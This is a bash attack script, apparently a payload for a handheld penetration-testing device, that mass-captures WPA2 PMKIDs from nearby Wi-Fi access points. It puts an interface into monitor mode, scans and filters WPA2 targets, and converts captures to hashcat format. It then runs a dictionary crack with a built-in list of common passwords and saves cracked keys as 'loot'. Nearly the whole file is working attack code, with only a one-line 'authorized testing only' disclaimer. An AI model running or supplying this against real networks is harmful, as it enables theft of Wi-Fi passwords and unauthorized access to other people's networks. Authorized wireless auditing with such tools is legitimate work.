#!/bin/bash
# Title: PMKID Blitz
# Author: bad-antics
# Description: Mass PMKID capture without client deauth - stealthy WPA2 attack
# Category: nullsec/attack
# Version: 1.0.0

LOOT_DIR="/mmc/nullsec/pmkid_blitz"
PMKID_FILE="$LOOT_DIR/pmkids.txt"
HASHCAT_FILE="$LOOT_DIR/hashcat_22000.txt"
LOG_FILE="$LOOT_DIR/session.log"
TARGETS_FILE="$LOOT_DIR/targets.csv"

mkdir -p "$LOOT_DIR"

log() {
    echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

PROMPT "⚡ PMKID BLITZ

Capture WPA2 PMKIDs without
deauthing clients!

Advantages:
• No client required
• Completely passive
• Faster than handshakes
• Works on most APs

Single EAPOL frame = crack!

⚠️ Authorized testing only!"

INTERFACE="${1:-wlan0}"

# Check for hcxdumptool
if ! command -v hcxdumptool &>/dev/null; then
    SPINNER_START "Installing hcxdumptool..."
    opkg update
    opkg install hcxdumptool hcxtools
    SPINNER_STOP
fi

# Kill interfering processes  
airmon-ng check kill &>/dev/null

# Put interface in monitor mode
SPINNER_START "Enabling monitor mode..."
airmon-ng start $INTERFACE &>/dev/null
MON_IFACE="${INTERFACE}mon"
if ! iwconfig $MON_IFACE &>/dev/null; then
    MON_IFACE="$INTERFACE"
    ip link set $INTERFACE down
    iw dev $INTERFACE set type monitor
    ip link set $INTERFACE up
fi
SPINNER_STOP

# Scan for targets
DIALOG "Target Selection:

[1] Scan all networks
[2] Target specific SSID
[3] Target by MAC/BSSID
[4] 5GHz only (less crowded)
[5] High-value (WPA3 check)" SCAN_CHOICE

case $SCAN_CHOICE in
    1)
        SCAN_ARGS=""
        ;;
    2)
        KEYBOARD "Enter target SSID:" TARGET_SSID
        SCAN_ARGS="--essid=$TARGET_SSID"
        ;;
    3)
        KEYBOARD "Enter target MAC:" TARGET_MAC
        SCAN_ARGS="--mac=$TARGET_MAC"
        ;;
    4)
        SCAN_ARGS="--band=a"
        ;;
    5)
        # Scan and filter for WPA2 only (WPA3 doesn't have PMKID vuln)
        SCAN_ARGS=""
        ;;
esac

SPINNER_START "Scanning for WPA2 targets..."

# Quick scan to identify targets
timeout 20 airodump-ng $MON_IFACE -w /tmp/pmkid_scan --write-interval 1 --output-format csv &>/dev/null

# Parse results
echo "BSSID,SSID,Channel,Signal,Encryption" > "$TARGETS_FILE"
grep -E "^([0-9A-Fa-f]{2}:){5}" /tmp/pmkid_scan*.csv 2>/dev/null | while IFS=',' read bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_len essid key; do
    # Only WPA2 targets (WPA3 SAE doesn't leak PMKID)
    if echo "$privacy" | grep -q "WPA2" && ! echo "$auth" | grep -q "SAE"; then
        echo "$bssid,$essid,$channel,$power,WPA2" >> "$TARGETS_FILE"
    fi
done

TARGET_COUNT=$(tail -n +2 "$TARGETS_FILE" | wc -l)
SPINNER_STOP

if [ "$TARGET_COUNT" -eq 0 ]; then
    ERROR_DIALOG "No WPA2 targets found!

WPA3-only networks are
not vulnerable to PMKID."
    airmon-ng stop $MON_IFACE &>/dev/null
    exit 1
fi

PROMPT "Found $TARGET_COUNT WPA2 targets

Top targets:
$(tail -n +2 "$TARGETS_FILE" | head -10 | while IFS=',' read b s c p e; do
    echo "• $s ($c) [$p dBm]"
done)

Press OK to start PMKID
capture blitz."

# Create filter file for specific targets
if [ -n "$TARGET_SSID" ] || [ -n "$TARGET_MAC" ]; then
    if [ -n "$TARGET_MAC" ]; then
        echo "$TARGET_MAC" | tr -d ':' > /tmp/pmkid_filter.txt
    fi
fi

# Main PMKID capture
log "Starting PMKID capture on $MON_IFACE"

PCAP_FILE="/tmp/pmkid_capture.pcapng"

SPINNER_START "Capturing PMKIDs (passive)..."

# Use hcxdumptool for PMKID capture
# --enable_status=1 shows live status
# --filterlist_ap can target specific APs
hcxdumptool -i $MON_IFACE -o "$PCAP_FILE" --enable_status=3 --tot=60 &>/dev/null &
DUMP_PID=$!

# Monitor progress
PMKID_COUNT=0
START_TIME=$(date +%s)

while kill -0 $DUMP_PID 2>/dev/null; do
    sleep 5
    
    # Check for PMKIDs in capture
    if [ -f "$PCAP_FILE" ]; then
        # Extract PMKIDs
        hcxpcapngtool -o /tmp/pmkid_temp.22000 "$PCAP_FILE" 2>/dev/null
        
        if [ -f /tmp/pmkid_temp.22000 ]; then
            NEW_COUNT=$(wc -l < /tmp/pmkid_temp.22000)
            if [ "$NEW_COUNT" -gt "$PMKID_COUNT" ]; then
                PMKID_COUNT=$NEW_COUNT
                LED G FAST
                sleep 1
                LED G SOLID
            fi
        fi
    fi
    
    ELAPSED=$(($(date +%s) - START_TIME))
    
    # Update status
    printf "\r[%02d:%02d] PMKIDs: %d" $((ELAPSED/60)) $((ELAPSED%60)) $PMKID_COUNT
done

SPINNER_STOP

# Process final results
log "Processing captured PMKIDs..."

if [ -f "$PCAP_FILE" ]; then
    # Convert to hashcat format
    hcxpcapngtool -o "$HASHCAT_FILE" -E "$LOOT_DIR/essid_list.txt" -I "$LOOT_DIR/identity_list.txt" "$PCAP_FILE" 2>/dev/null
    
    # Also create legacy format
    hcxpcapngtool --pmkid-eapol "$PMKID_FILE" "$PCAP_FILE" 2>/dev/null
    
    FINAL_COUNT=$(wc -l < "$HASHCAT_FILE" 2>/dev/null || echo 0)
    
    # Parse and show captured networks
    log "Captured $FINAL_COUNT PMKIDs"
    
    # Extract SSIDs from captures
    CAPTURED_SSIDS=""
    if [ -f "$LOOT_DIR/essid_list.txt" ]; then
        CAPTURED_SSIDS=$(cat "$LOOT_DIR/essid_list.txt" | head -10)
    fi
fi

# Cleanup monitor mode
airmon-ng stop $MON_IFACE &>/dev/null 2>&1

PROMPT "✅ PMKID BLITZ COMPLETE

Captured: $FINAL_COUNT PMKIDs

Networks captured:
$CAPTURED_SSIDS

Files saved:
• $HASHCAT_FILE (mode 22000)
• $PMKID_FILE

Crack with:
hashcat -m 22000 $HASHCAT_FILE wordlist.txt"

# Offer quick crack attempt
DIALOG "Try quick dictionary attack?

Uses built-in wordlist for
common passwords.

[1] Yes - Quick crack
[2] No - Export only" CRACK_CHOICE

if [ "$CRACK_CHOICE" = "1" ]; then
    if [ -f "$HASHCAT_FILE" ] && [ -s "$HASHCAT_FILE" ]; then
        SPINNER_START "Running quick crack..."
        
        # Create quick wordlist
        cat > /tmp/quick_wordlist.txt << 'WORDS'
password
12345678
password1
123456789
qwerty123
letmein
welcome
admin
password123
guest
changeme
wifi1234
wireless
internet
homewifi
WORDS
        
        # Try hashcat (if available) or john
        if command -v hashcat &>/dev/null; then
            hashcat -m 22000 -a 0 "$HASHCAT_FILE" /tmp/quick_wordlist.txt --quiet 2>/dev/null
            CRACKED=$(hashcat -m 22000 --show "$HASHCAT_FILE" 2>/dev/null)
        elif command -v john &>/dev/null; then
            john --wordlist=/tmp/quick_wordlist.txt "$HASHCAT_FILE" 2>/dev/null
            CRACKED=$(john --show "$HASHCAT_FILE" 2>/dev/null)
        fi
        
        SPINNER_STOP
        
        if [ -n "$CRACKED" ]; then
            echo "$CRACKED" > "$LOOT_DIR/cracked.txt"
            PROMPT "🔓 CRACKED!

$CRACKED

Saved to:
$LOOT_DIR/cracked.txt"
        else
            PROMPT "No quick cracks found.

Use larger wordlist:
hashcat -m 22000 \\
  $HASHCAT_FILE \\
  rockyou.txt"
        fi
    fi
fi

log "Session complete. $FINAL_COUNT PMKIDs captured."
